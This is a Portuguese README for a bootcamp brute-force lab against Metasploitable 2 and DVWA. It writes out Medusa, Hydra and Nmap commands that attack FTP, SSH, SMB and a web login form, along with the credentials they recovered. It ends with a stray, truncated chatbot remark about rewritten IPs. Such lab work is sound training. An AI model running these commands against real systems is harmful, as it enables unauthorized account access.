# Santander-Cyber segurança 2

Repositório com resposta aos desafios – Ataque de Força Bruta
Descrição do Desafio: Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis (por exemplo, Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

Configuração do ambiente:

Duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).

Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.

Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

🔑 Descrição do ataque
O ataque de força bruta (Brute Force Attack) é uma técnica utilizada para descobrir credenciais de acesso tentando todas as combinações possíveis até encontrar a correta. É um método simples, porém demorado, dependendo da complexidade das credenciais utilizadas.

⚙️ Preparando o ataque
Listas de palavras criadas:

bash
echo -e "user\nadmin1\nroot\nguest\nusuario\npentester" > users.txt
echo -e "secure123\nadmin2025\nrootpass\nqwerty\nletmein\npentestlab" > passwords.txt
Scan de hosts, portas e serviços com Nmap:

Certificar que o Kali e o Metasploitable estão na mesma rede usando ifconfig.

Endereço IP do Kali: 192.168.100.10

Endereço IP do Metasploitable: 192.168.100.20

Executar:

bash
nmap 192.168.100.20 -sV
🛠️ Executando os ataques
FTP (porta 21):

bash
medusa -H 192.168.100.20 -U users.txt -P passwords.txt -M ftp -t 6
Resultado: credenciais válidas pentester:pentestlab. Login confirmado via:

bash
ftp 192.168.100.20
SSH (porta 22):

bash
medusa -H 192.168.100.20 -U users.txt -P passwords.txt -M ssh -t 6
Resultado: mesmas credenciais válidas. Login confirmado via:

bash
ssh pentester@192.168.100.20
SMB (porta 445):

bash
medusa -H 192.168.100.20 -U users.txt -P passwords.txt -M smbnt -t 6
Resultado: credenciais válidas pentester:pentestlab. Login confirmado via:

bash
smbclient -L 192.168.100.20 -U pentester --password=pentestlab
🌐 Ataque em DVWA (HTTP)
Antes de iniciar, observar a requisição POST enviada pelo formulário de login. Exemplo:

Código
username=test&password=test&Login=Login
Hydra:

bash
hydra -L users.txt -P passwords.txt 192.168.100.20 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login falhou" -t 6
Nmap:

bash
nmap 192.168.100.20 --script http-form-brute --script-args userdb=users.txt,passdb=passwords.txt,path=/dvwa/login.php -p 80
Resultado: credenciais válidas admin1:secure123. Login confirmado na página DVWA.

👉 Pronto! Agora o texto está reescrito com novos IPs (192.168.100.10 / 192.168.100.20) e novas senhas/usuários (pentester:pentestlab, `admin1


